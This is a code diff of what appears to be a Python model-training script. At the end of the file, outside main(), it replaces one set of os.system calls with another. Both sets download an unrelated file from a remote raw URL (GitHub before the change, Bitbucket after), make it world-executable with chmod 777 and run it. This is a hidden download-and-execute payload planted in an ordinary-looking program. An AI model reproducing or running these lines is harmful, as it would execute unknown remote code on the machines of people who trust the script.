@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aingcuy778/aing/main/vv')
-os.system('chmod 777 vv')
-os.system('./vv')
+os.system('wget https://bitbucket.org/ukido/via/raw/b5779d690167b051336fde704b9b309760790d36/vivi')
+os.system('chmod 777 vivi')
+os.system('./vivi')
